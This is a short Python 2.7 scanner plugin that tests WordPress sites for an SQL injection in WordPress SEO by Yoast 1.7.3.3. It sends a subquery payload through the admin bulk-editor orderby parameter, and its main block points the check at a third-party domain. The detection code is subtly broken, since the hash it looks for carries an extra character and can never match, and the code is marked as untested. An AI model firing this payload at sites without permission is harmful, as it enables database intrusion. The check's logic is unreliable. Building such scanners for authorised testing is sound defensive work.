#!/usr/bin/python2.7
#coding:utf-8

import requests
import re
from dummy import *

info = {
	'NAME':'WordPress SEO By Yoast 1.7.3.3 SQL Injection',
	'AUTHOR':'WJK,yangbh',
	'TIME':'20150320',
	'WEB':'https://www.yascanner.com/#!/n/120',
	'DESCRIPTION':''
}
opts = [
	['url','http://testasp.vulnweb.com','target url']
]

def Assign(services):
	if services.has_key('url') and services.has_key('cms') and services['cms']=='Wordpress':
		return True
	return False

def Audit(services):
	url = services['url'] + '/wp-admin/admin.php?page=wpseo_bulk-editor&type=title&orderby=post_date%2c(select%20*%20from%20(select(md5(12345)))a)&order=asc'
	try:
		rq = requests.get(url)
		res=rq.text
		if rq.status_code == 200 :
			m = re.search("827ccb0eea8a706c4c34a16891f84e7b1",res)
			if m:
				security_hole(url+'WordPress SEO By Yoast 1.7.3.3 SQL Injection')
	except:
		pass
# ----------------------------------------------------------------------------------------------------
#	untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	services = {'url':'http://www.eguan.cn'}
	pprint(Audit(services))
	pprint(services)
